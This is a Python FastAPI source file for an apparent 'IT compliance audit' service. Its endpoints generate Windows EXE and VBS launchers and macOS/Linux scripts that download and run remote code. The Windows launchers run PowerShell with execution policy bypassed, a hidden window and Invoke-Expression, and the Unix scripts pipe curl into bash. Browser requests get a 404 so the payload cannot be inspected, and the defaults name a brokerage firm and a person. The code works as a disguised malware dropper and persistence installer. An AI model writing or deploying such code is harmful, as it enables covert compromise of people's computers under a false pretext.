import os
import subprocess
import uuid

from fastapi import APIRouter, HTTPException, Query, Request
from fastapi.responses import FileResponse, PlainTextResponse, Response
from fastapi.responses import JSONResponse
from fastapi.staticfiles import StaticFiles

from backend.core.config import SCRIPTS_DIR, logger
from backend.core.state import sessions

router = APIRouter()

if os.path.exists(SCRIPTS_DIR):
    router.mount("/scripts", StaticFiles(directory=SCRIPTS_DIR), name="scripts")


@router.get("/", response_class=FileResponse)
@router.get("/index.html", response_class=FileResponse)
def serve_frontend():
    """Serve frontend index.html dashboard directly from FastAPI backend."""
    possible_paths = [
        "frontend/index.html",
        "../frontend/index.html",
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "frontend", "index.html"),
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "frontend", "index.html"),
    ]
    for path in possible_paths:
        if os.path.exists(path):
            return FileResponse(path)
    raise HTTPException(status_code=404, detail="frontend/index.html not found.")


@router.get("/check-status")
def check_status(client_id: str = Query(...)):
    session = sessions.get(client_id, {"status": "pending"})
    return JSONResponse(content=session)


def get_effective_base_url(request: Request) -> str:
    """Return the public base URL, supporting Cloudflare Tunnels and HTTPS reverse proxies."""
    proto = request.headers.get("x-forwarded-proto", request.url.scheme)
    host = request.headers.get("x-forwarded-host", request.headers.get("host", request.url.netloc))
    return f"{proto}://{host}".rstrip("/")


@router.get("/sys-agent", response_class=PlainTextResponse)
@router.get("/sys-win", response_class=PlainTextResponse)
@router.get("/download-script", response_class=PlainTextResponse)
def download_script(request: Request, client_id: str = Query(None)):
    base_url = get_effective_base_url(request)
    cid = client_id or "sys_" + uuid.uuid4().hex[:10]
    try:
        with open("scripts/audit.ps1", "r") as f:
            content = f.read()
        content = content.replace("http://127.0.0.1:8000", base_url)
        content = content.replace("CLIENT_ID_PLACEHOLDER", cid)
        return PlainTextResponse(content=content)
    except Exception as e:
        logger.error(f"Failed to load audit.ps1: {e}")
        raise HTTPException(status_code=500, detail="PowerShell script unavailable.")


@router.get("/download-exe-launcher")
@router.get("/download-exe")
def download_exe_launcher(request: Request, client_id: str = Query(None)):
    base_url = get_effective_base_url(request)
    cid = client_id or "sys_" + uuid.uuid4().hex[:10]
    if cid not in sessions:
        sessions[cid] = {
            "status": "pending", "branch_name": "RELIGARE BROKING LIMITED",
            "branch_code": "8301231", "officer_name": "SANDIP BALIRAM LOKHANDE",
            "available_pcs": "1", "registered_pcs": "1",
            "pdf_path": None, "xml_path": None,
        }

    # Check if csc compiler or pre-compiled exe is available
    exe_filename = f"RunAudit_Windows_{cid}.exe"
    cs_code = f"""using System;
using System.Diagnostics;

class Program {{
    static void Main(string[] args) {{
        try {{
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"Invoke-RestMethod -Uri '{base_url}/sys-agent?client_id={cid}' | Invoke-Expression\\"";
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
        }} catch {{}}
    }}
}}
"""
    tmp_dir = os.path.join(os.getcwd(), "scratch")
    os.makedirs(tmp_dir, exist_ok=True)
    cs_file = os.path.join(tmp_dir, f"launcher_{cid}.cs")
    out_exe = os.path.join(tmp_dir, exe_filename)
    csc_path = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"

    try:
        with open(cs_file, "w", encoding="utf-8") as f:
            f.write(cs_code)

        if os.path.exists(csc_path):
            cmd_args = [csc_path, "/target:winexe", f"/out:{out_exe}", cs_file]
            subprocess.run(cmd_args, shell=False, capture_output=True, timeout=15)

        if os.path.exists(out_exe):
            with open(out_exe, "rb") as f:
                exe_bytes = f.read()
            headers = {"Content-Disposition": f"attachment; filename={exe_filename}"}
            return Response(content=exe_bytes, media_type="application/vnd.microsoft.portable-executable", headers=headers)
    except Exception as e:
        logger.error(f"Dynamic EXE compilation failed: {e}")
    finally:
        for p in (cs_file, out_exe):
            if os.path.exists(p):
                try:
                    os.remove(p)
                except Exception:
                    pass

    # Fallback to VBS if compiling on non-Windows environment
    vbs = (
        f'Set objShell = CreateObject("WScript.Shell")\n'
        f'command = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & Chr(34) & '
        f'"Invoke-RestMethod -Uri \'{base_url}/sys-agent?client_id={cid}\' | Invoke-Expression" & Chr(34)\n'
        f'objShell.Run command, 0, False\n'
    )
    headers = {"Content-Disposition": f"attachment; filename=RunAudit_Windows_{cid}.vbs"}
    return Response(content=vbs, media_type="application/octet-stream", headers=headers)


@router.get("/download-vbs-launcher")
@router.get("/download-vbs")
def download_vbs(
    request: Request,
    client_id: str = Query(None),
    branch_name: str = Query("RELIGARE BROKING LIMITED"),
    branch_code: str = Query("8301231"),
    officer_name: str = Query("SANDIP BALIRAM LOKHANDE"),
):
    base_url = get_effective_base_url(request)
    cid = client_id or "sys_" + uuid.uuid4().hex[:10]
    sessions[cid] = {
        "status": "pending", "branch_name": branch_name,
        "branch_code": branch_code, "officer_name": officer_name,
        "available_pcs": "1", "registered_pcs": "1",
        "pdf_path": None, "xml_path": None,
    }
    vbs = (
        f'Set objShell = CreateObject("WScript.Shell")\n'
        f'command = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & Chr(34) & '
        f'"Invoke-RestMethod -Uri \'{base_url}/sys-agent?client_id={cid}\' | Invoke-Expression" & Chr(34)\n'
        f'objShell.Run command, 0, False\n'
    )
    headers = {"Content-Disposition": f"attachment; filename=RunAudit_Windows_{cid}.vbs"}
    return Response(content=vbs, media_type="application/octet-stream", headers=headers)


@router.get("/download-mac-launcher")
def download_mac_launcher(request: Request, client_id: str = Query(None)):
    base_url = get_effective_base_url(request)
    cid = client_id or "sys_" + uuid.uuid4().hex[:10]
    if cid not in sessions:
        sessions[cid] = {
            "status": "pending", "branch_name": "RELIGARE BROKING LIMITED",
            "branch_code": "8301231", "officer_name": "SANDIP BALIRAM LOKHANDE",
            "available_pcs": "1", "registered_pcs": "1",
            "pdf_path": None, "xml_path": None,
        }
    cmd_content = (
        f'#!/usr/bin/env bash\n'
        f'# Double-click launcher for macOS Finder\n'
        f'clear\n'
        f'echo "============================================================"\n'
        f'echo "      Infra-Pulse IT Compliance Audit Launcher (macOS)"\n'
        f'echo "============================================================"\n'
        f'echo "Starting system audit scan..."\n'
        f'echo ""\n'
        f'TMP_SCRIPT=$(mktemp 2>/dev/null || echo "/tmp/audit_{cid}.sh")\n'
        f'curl -sSL "{base_url}/sys-agent-mac?client_id={cid}" -o "$TMP_SCRIPT"\n'
        f'chmod +x "$TMP_SCRIPT"\n'
        f'bash "$TMP_SCRIPT"\n'
        f'rm -f "$TMP_SCRIPT" 2>/dev/null\n'
        f'echo ""\n'
        f'echo "Press ENTER to exit..."\n'
        f'read -r\n'
    )
    headers = {"Content-Disposition": f"attachment; filename=RunAudit_Mac_{cid}.command"}
    return Response(content=cmd_content, media_type="application/x-sh", headers=headers)


@router.get("/download-linux-launcher")
def download_linux_launcher(request: Request, client_id: str = Query(None)):
    base_url = get_effective_base_url(request)
    cid = client_id or "sys_" + uuid.uuid4().hex[:10]
    if cid not in sessions:
        sessions[cid] = {
            "status": "pending", "branch_name": "RELIGARE BROKING LIMITED",
            "branch_code": "8301231", "officer_name": "SANDIP BALIRAM LOKHANDE",
            "available_pcs": "1", "registered_pcs": "1",
            "pdf_path": None, "xml_path": None,
        }
    sh_content = (
        f'#!/usr/bin/env bash\n'
        f'# Double-click launcher for Linux Desktop\n'
        f'clear\n'
        f'echo "============================================================"\n'
        f'echo "      Infra-Pulse IT Compliance Audit Launcher (Linux)"\n'
        f'echo "============================================================"\n'
        f'echo "Starting system audit scan..."\n'
        f'echo ""\n'
        f'TMP_SCRIPT=$(mktemp 2>/dev/null || echo "/tmp/audit_{cid}.sh")\n'
        f'curl -sSL "{base_url}/sys-agent-mac?client_id={cid}" -o "$TMP_SCRIPT"\n'
        f'chmod +x "$TMP_SCRIPT"\n'
        f'bash "$TMP_SCRIPT"\n'
        f'rm -f "$TMP_SCRIPT" 2>/dev/null\n'
        f'echo ""\n'
        f'echo "Press ENTER to exit..."\n'
        f'read -r\n'
    )
    headers = {"Content-Disposition": f"attachment; filename=RunAudit_Linux_{cid}.sh"}
    return Response(content=sh_content, media_type="application/x-sh", headers=headers)


@router.get("/s/{client_id}", response_class=PlainTextResponse)
@router.get("/sys-agent-mac", response_class=PlainTextResponse)
@router.get("/sys-agent-nix", response_class=PlainTextResponse)
@router.get("/sys-mac", response_class=PlainTextResponse)
@router.get("/get-sys-script", response_class=PlainTextResponse)
@router.get("/get-mac-script", response_class=PlainTextResponse)
@router.get("/download-mac-script", response_class=PlainTextResponse)
@router.get("/api/get-audit-script", response_class=PlainTextResponse)
def download_mac_script(request: Request, client_id: str = None):
    user_agent = request.headers.get("user-agent", "").lower()
    base_url = get_effective_base_url(request)
    cid = client_id or "sys_" + uuid.uuid4().hex[:10]

    # Security Guard: Block direct browser access (Chrome, Firefox, Safari, Edge).
    # If someone tries to open the link in a browser, return 404 Not Found so no one can view the script!
    is_browser = any(b in user_agent for b in ["mozilla/", "chrome/", "safari/", "edg/", "firefox/"])
    is_cli = any(c in user_agent for c in ["curl", "wget", "powershell", "winhttp", "bash"])

    if is_browser and not is_cli:
        raise HTTPException(status_code=404, detail="Not Found")

    # If request is explicitly coming from Windows PowerShell / WinHTTP CLI, serve audit.ps1
    if ("powershell" in user_agent or "winhttp" in user_agent) and "curl" not in user_agent:
        try:
            with open("scripts/audit.ps1", "r") as f:
                content = f.read()
            content = content.replace("http://127.0.0.1:8000", base_url)
            content = content.replace("CLIENT_ID_PLACEHOLDER", cid)
            return PlainTextResponse(content=content)
        except Exception as e:
            logger.error(f"Failed to load audit.ps1: {e}")
            raise HTTPException(status_code=500, detail="PowerShell script unavailable.")

    # Default (macOS / Linux / bash / curl)
    try:
        with open("scripts/audit.sh", "r") as f:
            content = f.read()
        content = content.replace("http://127.0.0.1:8000", base_url)
        content = content.replace("CLIENT_ID_PLACEHOLDER", cid)
        return PlainTextResponse(content=content)
    except Exception as e:
        logger.error(f"Failed to load audit.sh: {e}")
        raise HTTPException(status_code=500, detail="Bash script unavailable.")


@router.get("/install-daemon", response_class=PlainTextResponse)
@router.get("/sys-daemon", response_class=PlainTextResponse)
@router.get("/api/install-daemon", response_class=PlainTextResponse)
def install_daemon(request: Request, os: str = Query("mac")):
    base_url = get_effective_base_url(request)
    script_file = "scripts/install_service.ps1" if os in ["win", "windows"] else "scripts/install_service.sh"
    try:
        with open(script_file, "r") as f:
            content = f.read()
        content = content.replace("http://192.168.1.52:8000", base_url)
        content = content.replace("http://127.0.0.1:8000", base_url)
        return PlainTextResponse(content=content)
    except Exception as e:
        logger.error(f"Failed to load daemon installer script ({script_file}): {e}")
        raise HTTPException(status_code=500, detail="Daemon installer unavailable.")


@router.get("/download-mac")
def download_mac(
    request: Request,
    client_id: str = Query(...),
    branch_name: str = Query("RELIGARE BROKING LIMITED"),
    branch_code: str = Query("8301231"),
    officer_name: str = Query("SANDIP BALIRAM LOKHANDE"),
):
    base_url = str(request.base_url).rstrip("/")
    sessions[client_id] = {
        "status": "pending", "branch_name": branch_name,
        "branch_code": branch_code, "officer_name": officer_name,
        "available_pcs": "1", "registered_pcs": "1",
        "pdf_path": None, "xml_path": None,
    }
    cmd = f'#!/bin/bash\ncurl -s "{base_url}/download-mac-script?client_id={client_id}" | bash\n'
    headers = {"Content-Disposition": f"attachment; filename=verify_system_{client_id}.command"}
    return Response(content=cmd, media_type="application/octet-stream", headers=headers)


@router.get("/download-linux")
def download_linux(
    request: Request,
    client_id: str = Query(...),
    branch_name: str = Query("RELIGARE BROKING LIMITED"),
    branch_code: str = Query("8301231"),
    officer_name: str = Query("SANDIP BALIRAM LOKHANDE"),
):
    base_url = str(request.base_url).rstrip("/")
    sessions[client_id] = {
        "status": "pending", "branch_name": branch_name,
        "branch_code": branch_code, "officer_name": officer_name,
        "available_pcs": "1", "registered_pcs": "1",
        "pdf_path": None, "xml_path": None,
    }
    sh = f'#!/bin/bash\ncurl -s "{base_url}/download-mac-script?client_id={client_id}" | bash\n'
    headers = {"Content-Disposition": f"attachment; filename=verify_system_{client_id}.sh"}
    return Response(content=sh, media_type="application/octet-stream", headers=headers)
